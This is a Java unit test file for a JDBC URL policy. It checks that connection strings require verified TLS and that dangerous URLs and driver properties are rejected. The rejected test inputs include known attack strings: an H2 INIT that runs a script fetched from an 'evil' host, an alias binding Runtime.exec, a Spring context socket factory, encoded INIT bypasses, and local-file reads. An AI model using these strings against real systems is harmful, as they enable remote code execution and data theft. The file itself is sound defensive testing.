package at.jdbcodata.datasource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import at.jdbcodata.common.InvalidRequestException;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class JdbcUrlPolicyTest {

    private final JdbcUrlPolicy policy = new JdbcUrlPolicy(List.of(), false);
    private final JdbcUrlPolicy tls = new JdbcUrlPolicy(List.of("jdbc:sqlserver:"), true, true);

    @Test
    void tlsIsNotCheckedByDefault() {
        assertThatCode(() -> policy.checkTls("jdbc:postgresql://db/x", Map.of())).doesNotThrowAnyException();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://db/x?sslmode=verify-full",
            "jdbc:postgresql://db/x?ApplicationName=a&sslmode=verify-ca&sslrootcert=/certs/ca.crt",
            "jdbc:mariadb://db/x?sslMode=verify-full",
            "jdbc:mariadb:sequential://a,b/x?sslMode=verify-ca",
            "jdbc:oracle:thin:@tcps://db:2484/ORCL",
            "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL = TCPS)(HOST=db)(PORT=2484))(CONNECT_DATA=(SERVICE_NAME=x)))",
            "jdbc:h2:mem:demo"})
    void acceptsVerifiedTls(String url) {
        assertThatCode(() -> tls.checkTls(url, null)).doesNotThrowAnyException();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://db/x",
            "jdbc:postgresql://db/x?ssl=true",
            "jdbc:postgresql://db/x?sslmode=require",
            "jdbc:postgresql://db/x?sslmode=disable",
            "jdbc:postgresql://db/x?sslMode=verify-full",                   // the driver ignores this spelling
            "jdbc:postgresql://db/x?sslmode=verify-full&sslmode=disable",   // the last one wins
            "jdbc:postgresql://db/x?sslmode=verify-full&SSLMODE=disable",
            "jdbc:postgresql://db/x?a=b%26sslmode=verify-full",             // a value, not an option
            "jdbc:mariadb://db/x",
            "jdbc:mariadb://db/x?sslMode=trust",
            "jdbc:mariadb://db/x?sslMode=verify-full&sslMode=disable",
            "jdbc:mariadb://db/x?useSsl=true",
            "jdbc:mariadb://db/x?sslMode=verify-full&trustServerCertificate=true",
            "jdbc:mariadb://db/x?sslMode=verify-full&disableSslHostnameVerification=true",
            "jdbc:oracle:thin:@//db:1521/ORCL",
            "jdbc:oracle:thin:@tcp://db:1521/ORCL",
            "jdbc:oracle:thin:@ALIAS",
            "jdbc:oracle:thin:@tcps://a:2484/x,tcp://b:1521/x",
            "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCPS)(HOST=a))(ADDRESS=(PROTOCOL=TCP)(HOST=b)))",
            "jdbc:oracle:thin:@tcps://db:2484/ORCL?oracle.net.ssl_server_dn_match=false",
            "jdbc:sqlserver://db;encrypt=true",
            "jdbc:h2:tcp://db/x"})
    void refusesConnectionsWithoutVerifiedTls(String url) {
        assertThatThrownBy(() -> tls.checkTls(url, Map.of())).isInstanceOf(InvalidRequestException.class)
                .hasMessageContaining("TLS is required");
    }

    @Test
    void readsDriverPropertiesLikeTheUrl() {
        assertThatCode(() -> tls.checkTls("jdbc:postgresql://db/x", Map.of("sslmode", "verify-full"))).doesNotThrowAnyException();
        assertThatThrownBy(() -> tls.checkTls("jdbc:postgresql://db/x?sslmode=verify-full", Map.of("sslmode", "disable")))
                .isInstanceOf(InvalidRequestException.class);
        assertThatThrownBy(() -> tls.checkTls("jdbc:postgresql://db/x", Map.of("sslMode", "verify-full")))
                .isInstanceOf(InvalidRequestException.class);
        assertThatThrownBy(() -> tls.checkTls("jdbc:mariadb://db/x", Map.of("sslMode", "verify-full", "trustServerCertificate", "true")))
                .isInstanceOf(InvalidRequestException.class);
        assertThatThrownBy(() -> tls.checkTls("jdbc:oracle:thin:@tcps://db:2484/x", Map.of("oracle.net.ssl_server_dn_match", "false")))
                .isInstanceOf(InvalidRequestException.class);
    }

    /** What the check accepts must be what the bundled drivers do. */
    @Test
    void agreesWithTheDrivers() throws Exception {
        String postgres = "jdbc:postgresql://db/x?a=b&sslmode=verify-full";
        tls.checkTls(postgres, Map.of());
        assertThat(org.postgresql.Driver.parseURL(postgres, new java.util.Properties()).getProperty("sslmode")).isEqualTo("verify-full");
        String mariadb = "jdbc:mariadb://db/x?a=b&sslMode=verify-full";
        tls.checkTls(mariadb, Map.of());
        assertThat(org.mariadb.jdbc.Configuration.parse(mariadb, new java.util.Properties()).sslMode())
                .isEqualTo(org.mariadb.jdbc.export.SslMode.VERIFY_FULL);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:postgresql://db:5432/demo?sslmode=require&ApplicationName=x",
            "jdbc:mariadb://db:3306/demo?useSsl=true",
            "jdbc:oracle:thin:@//db:1521/ORCL",
            "  JDBC:PostgreSQL://db/demo"})
    void allowsNetworkDrivers(String url) {
        assertThatCode(() -> policy.check(url, null)).doesNotThrowAnyException();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
            "jdbc:h2:file:./data/jdbcodata",
            "jdbc:h2:./data/jdbcodata",
            "jdbc:h2:~/x",
            "jdbc:sqlite:/etc/passwd",
            "jdbc:derby:memory:x;create=true",
            "jdbc:h2:tcp://db/x;INIT=CREATE ALIAS X FOR \"java.lang.Runtime.exec\"",
            "jdbc:h2:tcp://db/x;init = select 1",
            "jdbc:h2:tcp://db/x;%49NIT=select 1",
            "jdbc:h2:tcp://db/x;%2549NIT=select 1",
            "jdbc:postgresql://db/x?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext",
            "jdbc:postgresql://db/x?sslfactory=x&sslfactoryarg=y",
            "jdbc:postgresql://db/x?readOnlyMode=ignore",
            "jdbc:postgresql://db/x?authenticationPluginClassName=x",
            "jdbc:mariadb://db/x?allowLocalInfile=true",
            "jdbc:mariadb://db/x?allowMultiQueries=true",
            "jdbc:mariadb://db/x?initSql=delete from t",
            "jdbc:h2:tcp://db/x;x=1 runscript from 'a'",
            "jdbc:postgresql://db/x?user=a&password=secret",
            "jdbc:postgresql://a:secret@db/x",
            "jdbc:mariadb://db/x?pwd=secret",
            "jdbc:h2:tcp://db/x;PASSWORD=secret",
            "jdbc:oracle:thin:scott/tiger@//db:1521/ORCL",
            "jdbc:h2:tcp://db:9092/demo",
            "jdbc:h2:ssl://db:9092/demo",
            "jdbc:h2:TCP:/x/y",
            "jdbc:h2:%74cp:/x/y",
            "jdbc:h2:Ssl:/x/y",
            "jdbc:postgresql://db/x?connectExecutor=x&connectExecutorArg=y",
            "jdbc:postgresql://db/x?xmlFactoryFactory=x",
            "jdbc:postgresql://db/x?classLoaderStrategy=x",
            "jdbc:postgresql://db/x?gssLib=x",
            "jdbc:postgresql://db/x?options=-c%20default_transaction_read_only=off",
            "jdbc:mariadb://db/x?sessionVariables=sql_mode=x",
            "jdbc:mariadb://db/x?credentialType=x",
            "jdbc:mariadb://db/x?tlsSocketType=x",
            "jdbc:mariadb://db/x?localSocket=/tmp/x",
            "jdbc:postgresql://db/x?sslpassword=secret",
            "jdbc:mariadb://db/x?keyStorePassword=secret",
            "jdbc:mariadb://db/x?trustStorePassword=secret",
            ""})
    void rejectsDangerousUrls(String url) {
        assertThatThrownBy(() -> policy.check(url, null)).isInstanceOf(InvalidRequestException.class);
    }

    @Test
    void embeddedH2OnlyWhenEnabledAndStillWithoutInit() {
        JdbcUrlPolicy demo = new JdbcUrlPolicy(List.of(), true);
        assertThatCode(() -> demo.check("jdbc:h2:mem:demo;MODE=PostgreSQL;DB_CLOSE_DELAY=-1", null))
                .doesNotThrowAnyException();
        assertThatThrownBy(() -> demo.check("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'x'", null))
                .isInstanceOf(InvalidRequestException.class);
    }

    /** H2 decides on the raw URL: {@code jdbc:h2:TCP:/x} is an embedded file database, whatever the prefix says. */
    @Test
    void remoteH2OnlyViaConfigAndNeverWithAlteredPrefix() {
        JdbcUrlPolicy remote = new JdbcUrlPolicy(List.of("jdbc:h2:tcp:"), false);
        assertThatCode(() -> remote.check("jdbc:h2:tcp://db:9092/demo;MODE=PostgreSQL", null)).doesNotThrowAnyException();
        assertThatThrownBy(() -> remote.check("jdbc:h2:TCP:/x/y", null)).isInstanceOf(InvalidRequestException.class);
        assertThatThrownBy(() -> remote.check("jdbc:h2:%74cp:/x/y", null)).isInstanceOf(InvalidRequestException.class);

        JdbcUrlPolicy embedded = new JdbcUrlPolicy(List.of(), true);
        assertThatThrownBy(() -> embedded.check("jdbc:h2:tcp://db:9092/demo", null))
                .isInstanceOf(InvalidRequestException.class);
    }

    @Test
    void extraPrefixesFromConfig() {
        JdbcUrlPolicy p = new JdbcUrlPolicy(List.of("jdbc:sqlserver:", " "), false);
        assertThatCode(() -> p.check("jdbc:sqlserver://db:1433;databaseName=x", null)).doesNotThrowAnyException();
    }

    @Test
    void driverClassMustBeAJdbcDriver() {
        assertThatCode(() -> policy.check("jdbc:postgresql://db/x", "org.postgresql.Driver")).doesNotThrowAnyException();
        assertThatThrownBy(() -> policy.check("jdbc:postgresql://db/x", "java.lang.Runtime"))
                .isInstanceOf(InvalidRequestException.class).hasMessageContaining("not a java.sql.Driver");
        assertThatThrownBy(() -> policy.check("jdbc:postgresql://db/x", "does.not.Exist"))
                .isInstanceOf(InvalidRequestException.class).hasMessageContaining("not found");
    }

    @Test
    void allowsHarmlessDriverProperties() {
        assertThatCode(() -> policy.checkDriverProperties(java.util.Map.of(
                "oracle.jdbc.defaultNChar", "true", "ApplicationName", "jdbcodata", "sslmode", "require")))
                .doesNotThrowAnyException();
    }

    @ParameterizedTest
    @ValueSource(strings = {"socketFactory", "INIT", "sslfactory", "password", "user", "javax.net.ssl.keyStorePassword",
            "oracle.jdbc.loggerfile", "allowLoadLocalInfile", "bad key", "client_secret"})
    void rejectsDangerousDriverProperties(String key) {
        assertThatThrownBy(() -> policy.checkDriverProperties(java.util.Map.of(key, "x")))
                .isInstanceOf(InvalidRequestException.class);
    }

    @Test
    void rejectsSqlAndMultiLineDriverPropertyValues() {
        assertThatThrownBy(() -> policy.checkDriverProperties(java.util.Map.of("MODE", "x;RUNSCRIPT FROM 'y'")))
                .isInstanceOf(InvalidRequestException.class);
        assertThatThrownBy(() -> policy.checkDriverProperties(java.util.Map.of("ApplicationName", "a\nb")))
                .isInstanceOf(InvalidRequestException.class);
    }
}
